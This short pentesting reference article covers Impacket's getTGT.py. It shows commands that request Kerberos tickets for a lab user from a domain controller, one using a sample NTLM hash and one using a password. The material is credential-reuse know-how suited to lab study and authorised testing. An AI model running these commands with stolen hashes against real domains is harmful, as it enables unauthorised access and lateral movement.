---
categories: [Tools,Knowledge-article]
tags: [getTGT,impacket,impacket-getTGT,getTGT.py,kerberos, TGT]
---

## About
Impacket’s `getTGT.py` uses a valid user’s NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.

**Command Reference:**

**Command:**
1. With user's NTLM hashes-
```shell
python3 getTGT.py lab.lcl/tony -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7

```
2. With username and password
```shell
python3 getTGT.py lab.lcl/tony:'P@$$w0rD' -dc-ip 10.10.10.1

```
> You can use DNS Name instead of IP Address for the `-dc-ip`
{: .prompt-info }


References: \
https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py \
https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
